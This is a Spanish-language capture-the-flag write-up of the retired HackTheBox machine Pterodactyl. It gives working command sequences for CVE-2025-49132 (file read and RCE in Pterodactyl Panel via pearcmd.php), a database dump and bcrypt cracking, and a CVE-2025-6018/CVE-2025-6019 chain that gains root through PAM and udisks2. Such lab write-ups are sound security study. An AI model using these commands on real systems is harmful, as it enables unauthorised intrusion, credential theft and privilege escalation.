---
title: "htb // pterodactyl"
date: 2026-06-10
description: "writeup ténico sobre la máquina ya retirada llamada Pterodactyl"
tags: ["medium", "linux", "htb", "writeup", "RCE"]
draft: false
---
# HackTheBox: Pterodactyl

**Dificultad:** Medium · **SO:** Linux · **Temas:** Web, Path Traversal, RCE, Escalada de privilegios

## Resumen del recorrido

Pterodactyl es una máquina Linux que se compromete explotando un **panel de gestión de servidores de juego Pterodactyl** desactualizado. El camino completo:

- Se explota un **path traversal (CVE-2025-49132)** en Pterodactyl Panel para filtrar las credenciales de la base de datos desde los ficheros de configuración de Laravel.
- Se encadena el mismo CVE hacia **RCE** abusando del endpoint `/locales/locale.json`, que incluye `pearcmd.php` sin saneo → ejecución de código como `wwwrun`.
- A través del RCE se vuelca la tabla de usuarios de la base de datos, se crackea un hash bcrypt y se obtiene acceso **SSH** como `phileasfogg3`.
- Para escalar a root se encadenan dos vulnerabilidades recientes: **CVE-2025-6018** (envenenamiento de variables de entorno en PAM/`pam_env`) para que polkit trate la sesión SSH como una sesión gráfica local activa, y **CVE-2025-6019** (bug de redimensionado XFS en `udisks2`), que monta temporalmente sin `nosuid` y permite ejecutar un `bash` SUID root.

---

## Reconocimiento

### nmap

```bash
nmap -sC -sV pterodactyl.htb --min-rate 1000
```

```
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 9.6 (protocol 2.0)
80/tcp   open   http       nginx 1.21.5
|_http-title: My Minecraft Server
|_http-server-header: nginx/1.21.5
443/tcp  closed https
8080/tcp closed http-proxy
```

Al tratarse de un servidor de Minecraft, también se comprueba el puerto típico:

```bash
nmap -p 25565 -sV <IP_OBJETIVO>
```

```
PORT      STATE    SERVICE   VERSION
25565/tcp filtered minecraft
```

El puerto de Minecraft está **filtrado**: no es accesible directamente desde fuera.

### Enumeración de directorios

```bash
feroxbuster -u http://pterodactyl.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --filter-status 404
```

```
200  GET  http://pterodactyl.htb/global.css
200  GET  http://pterodactyl.htb/changelog.txt
200  GET  http://pterodactyl.htb/Public/Header.png
200  GET  http://pterodactyl.htb/
301  GET  http://pterodactyl.htb/Public => http://pterodactyl.htb/Public/
```

### Análisis del changelog

La página principal enlaza un `changelog.txt` que filtra mucha información útil:

```
MonitorLand - CHANGELOG.txt
======================================

Version 1.20.X

[Added] Main Website Deployment
- Deployed the primary landing site for MonitorLand.
- Implemented homepage, and link for Minecraft server.

[Linked] Subdomain Configuration
- Added DNS and reverse proxy routing for play.pterodactyl.htb.
- Configured NGINX virtual host for subdomain forwarding.

[Installed] Pterodactyl Panel v1.11.10
- Installed Pterodactyl Panel.
- Configured environment:
  - PHP with required extensions.
  - MariaDB 11.8.3 backend.

[Enhanced] PHP Capabilities
- Enabled PHP-FPM for smoother website handling on all domains.
- Enabled PHP-PEAR for PHP package management.
- Added temporary PHP debugging via phpinfo()
```

Puntos clave que se extraen:

- **Pterodactyl Panel v1.11.10**: panel de gestión de servidores de juego, versión antigua → probablemente vulnerable.
- **MariaDB 11.8.3** como backend → posible reutilización de credenciales o vectores de inyección.
- **`phpinfo()` habilitado** → divulgación de información gratuita.
- **PHP-PEAR instalado** → se vuelve importante en la fase de RCE.

### Enumeración con phpinfo

Como el changelog confirma que el debugging con `phpinfo()` está activo:

```bash
curl http://pterodactyl.htb/phpinfo.php -o phpinfo.html
```

Filtrando el resultado aparecen dos detalles relevantes. Primero, no hay funciones deshabilitadas:

```bash
grep -i "disable_functions" phpinfo.html
```

```html
<tr><td class="e">disable_functions</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
```

`disable_functions` está vacío, así que funciones peligrosas como `system()` o `exec()` están disponibles: si conseguimos ejecutar PHP, tenemos **RCE**.

Segundo, el `include_path`:

```html
<tr><td class="e">include_path</td><td class="v">.:/usr/share/php8:/usr/share/php/PEAR</td>...</tr>
```

PEAR vive en `/usr/share/php/PEAR`, **no** en la ruta por defecto `/usr/share/php`. Conviene recordar esto para la explotación.

### Enumeración de subdominios

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://pterodactyl.htb -H "Host: FUZZ.pterodactyl.htb" -fs 145 -t 100
```

```
panel  [Status: 200, Size: 1897, Words: 490, Lines: 36]
```

Se encuentra el panel de Pterodactyl en **`panel.pterodactyl.htb`**.

> Nota práctica: filtrar por número de palabras (`-fw 1`) en lugar de por tamaño (`-fs 145`) genera muchos falsos positivos (redirecciones 302, todas de tamaño 145). En enumeración de subdominios conviene filtrar de forma agresiva por tamaño.

---

## Acceso inicial

### CVE-2025-49132 — filtrado de credenciales de la base de datos

Existe un PoC para **CVE-2025-49132**, un path traversal en Pterodactyl Panel que permite leer los ficheros de configuración de Laravel (no es un LFI general: está limitado a la configuración de la app).

El primer intento con el PoC falla porque tiene la ruta del panel **hardcodeada**. Como aquí el panel está en un subdominio y no en la ruta por defecto, hay que apuntar el PoC a la URL correcta:

```bash
python3 poc.py http://panel.pterodactyl.htb
```

```
http://panel.pterodactyl.htb/ => pterodactyl:PteraPanel@127.0.0.1:3306/panel
```

Credenciales de la base de datos filtradas:

- **Usuario:** `pterodactyl`
- **Contraseña:** `PteraPanel`
- **Base de datos:** `panel` en `127.0.0.1:3306`

Son credenciales **locales de la BD**, no de login del panel: no sirven para el login web.

### CVE-2025-49132 — ejecución remota de código

Existe un segundo PoC que encadena el mismo CVE hacia **RCE** a través del endpoint `/locales/locale.json`.

Cómo funciona: los parámetros `locale` y `namespace` se pasan directamente al `include()` de PHP sin saneo ni autenticación. Normalmente hay un parámetro `hash` que previene el abuso, pero en las versiones sin parchear no se aplica. El PoC aprovecha esto para incluir `pearcmd.php` (recuerda el PHP-PEAR del changelog), que puede abusarse para escribir y ejecutar ficheros PHP arbitrarios.

Los primeros intentos fallan con "no output (pearcmd not present on target?)":

```bash
python3 rce.py http://panel.pterodactyl.htb --rce-cmd "id"
```

El PoC busca `pearcmd.php` en `/usr/share/php` por defecto, pero `phpinfo` ya nos dijo que la ruta real es `/usr/share/php/PEAR`. Corrigiéndolo:

```bash
python3 rce.py http://panel.pterodactyl.htb --rce-cmd "id" --pear-dir /usr/share/php/PEAR
```

```
  RCE (pearcmd) — id
  [+] Output:
uid=474(wwwrun) gid=477(www) groups=477(www)
```

Tenemos RCE como `wwwrun`.

> Detalle: en esta máquina no se consigue una reverse shell estable (fallan distintas codificaciones, shells y listeners), así que la enumeración posterior se realiza **manualmente a través del propio RCE**.

### Volcado de la base de datos vía RCE

Como ya teníamos credenciales de la BD pero no se podía conectar directamente (el cliente `mysql` no cooperaba en la máquina), se escribe un script PHP a través del RCE para consultar la base de datos.

Primero se escribe el script:

```bash
python3 rce.py http://panel.pterodactyl.htb --rce-cmd "printf '<?php \$c=new mysqli(\"127.0.0.1\",\"pterodactyl\",\"PteraPanel\",\"panel\");\$r=\$c->query(\"SELECT id,username,email,password FROM users\");\nwhile(\$row=\$r->fetch_assoc()){echo \$row[\"id\"].\",\".\$row[\"username\"].\",\".\$row[\"email\"].\",\".\$row[\"password\"].\"\\n\";} ?>' > /tmp/q.php" --pear-dir /usr/share/php/PEAR
```

Y después se ejecuta:

```bash
python3 rce.py http://panel.pterodactyl.htb --rce-cmd "php /tmp/q.php" --pear-dir /usr/share/php/PEAR
```

```
[+] Output:
2,headmonitor,headmonitor@pterodactyl.htb,$2y$10$3WJht3/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2
3,phileasfogg3,phileasfogg3@pterodactyl.htb,$2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi
```

### Crackeo de hashes y acceso SSH

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

```
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
!QAZ2wsx         (phileasfogg3)
```

Solo crackea el hash de `phileasfogg3`. Con esas credenciales (`phileasfogg3:!QAZ2wsx`) se entra por SSH y se obtiene `user.txt`.

```bash
ssh phileasfogg3@pterodactyl.htb
```

---

## Escalada de privilegios

### sudo y la trampa de targetpw

```bash
sudo -l
```

```
User phileasfogg3 may run the following commands on pterodactyl:
    (ALL) ALL
```

A primera vista parece que se puede ejecutar **cualquier cosa** con sudo, pero al intentarlo realmente pide la contraseña de **root**, no la nuestra. El motivo es la opción **`targetpw`** en los defaults de sudo: con `targetpw`, sudo pide la contraseña del usuario objetivo (root por defecto) en lugar de la del usuario que invoca el comando. Es decir, `(ALL) ALL` es prácticamente inútil sin conocer la contraseña de root.

### CVE-2025-6018 — envenenamiento de variables de entorno en PAM

Comprobando la versión de PAM:

```bash
rpm -qi pam | grep -E "Version|Release"
```

```
Version : 1.3.0
Release : 150000.6.66.1
```

PAM 1.3.0 es vulnerable a **CVE-2025-6018**. La vulnerabilidad está en el módulo `pam_env`, donde `user_readenv` viene habilitado por defecto. Cuando un usuario se autentica por SSH, `pam_env` lee `~/.pam_environment`, y cualquier variable que se defina ahí es procesada más adelante por `pam_systemd` en la pila de la sesión. Esto permite inyectar variables de entorno que engañan a systemd para que trate la sesión como una **sesión gráfica local**.

Se verifica que el módulo está cargado:

```bash
grep -r "pam_env" /etc/pam.d/
```

```
/etc/pam.d/common-auth:auth required pam_env.so
/etc/pam.d/common-session:session optional pam_env.so
```

Se ejecuta el PoC:

```bash
python3 CVE-2025-6018.py -i <IP_OBJETIVO> -u phileasfogg3 -p '!QAZ2wsx'
```

Esto escribe en `~/.pam_environment`:

```
XDG_SEAT OVERRIDE=seat0
XDG_VTNR OVERRIDE=1
XDG_SESSION_TYPE OVERRIDE=x11
XDG_SESSION_CLASS OVERRIDE=user
XDG_RUNTIME_DIR OVERRIDE=/tmp/runtime
```

Tras **reautenticarse por SSH**, polkit pasa a ver nuestra sesión como una sesión gráfica local activa. Esto es importante porque desbloquea acciones de polkit marcadas como `implicit active: yes` (no requieren autenticación para sesiones "activas"). Todavía no somos root, pero ahora tenemos acceso a acciones de `udisks2` como montar y redimensionar sistemas de archivos sin autenticación.

### CVE-2025-6019 — exploit de redimensionado XFS en udisks2

Se comprueba qué acciones de polkit están disponibles para sesiones activas:

```bash
pkaction --verbose | grep "implicit active: yes"
```

Aparecen varias acciones de `udisks2` disponibles sin autenticación:

- `org.freedesktop.udisks2.loop-setup`
- `org.freedesktop.udisks2.filesystem-mount`
- `org.freedesktop.udisks2.modify-device`

El primer instinto es crear una imagen ext4 con un `bash` SUID, montarla con `udisks2` y ejecutarla. El problema es que `udisks2` monta con `nosuid` por defecto y no se puede sobrescribir:

```bash
udisksctl mount -b /dev/loop0 -o suid,dev,exec
# Error: Mount option `suid` is not allowed
```

Aquí entra **CVE-2025-6019**. Cuando `udisks2` redimensiona un sistema de archivos **XFS** vía D-Bus, lo monta temporalmente **sin** el flag `nosuid`. El ataque es:

1. Crear una imagen XFS que contenga un `bash` SUID root.
2. Configurar un loop device y mantener el sistema de archivos ocupado para que no pueda desmontarse.
3. Disparar un redimensionado vía D-Bus, que vuelve a montar sin `nosuid`.
4. Ejecutar el `bash` SUID.

La imagen XFS se genera en local (se necesita root para poner el bit SUID) y se transfiere a la máquina. Después, en el objetivo:

```bash
# en el objetivo
cd /tmp

# detener el volume monitor de gvfs para evitar interferencias de automontaje
killall -KILL gvfs-udisks2-volume-monitor 2>/dev/null

# crear el loop device a partir de la imagen XFS
LOOP_DEV=$(udisksctl loop-setup --file ./xfs.image --no-user-interaction | grep -o '/dev/loop[0-9]*')

# mantener el sistema de archivos ocupado en segundo plano para impedir el desmontaje
while true; do /tmp/blockdev*/bash -c 'sleep 10; ls -l /tmp/blockdev*/bash' && break; done 2>/dev/null &

# disparar la vulnerabilidad: el resize provoca un remount sin nosuid
gdbus call --system --dest org.freedesktop.UDisks2 \
  --object-path "/org/freedesktop/UDisks2/block_devices/${LOOP_DEV##*/}" \
  --method org.freedesktop.UDisks2.Filesystem.Resize 0 '{}'

sleep 2

# encontrar y ejecutar el bash SUID
find /tmp -path "/tmp/blockdev*/bash" -perm -4000 -exec {} -p \;
```

```
bash-5.3# id
uid=1002(phileasfogg3) gid=100(users) euid=0(root) groups=100(users)

bash-5.3# whoami
root

bash-5.3# cat /root/root.txt
<flag>
```

Y con eso se obtiene shell como **root** y la flag final.

---

## Resumen de CVEs encadenados

| CVE | Componente | Efecto |
|-----|-----------|--------|
| CVE-2025-49132 | Pterodactyl Panel v1.11.10 | Path traversal → fuga de config + RCE vía `pearcmd.php` |
| CVE-2025-6018 | PAM 1.3.0 (`pam_env`) | Inyección de variables de entorno → sesión vista como gráfica local activa |
| CVE-2025-6019 | udisks2 (resize XFS) | Remount sin `nosuid` → ejecución de `bash` SUID root |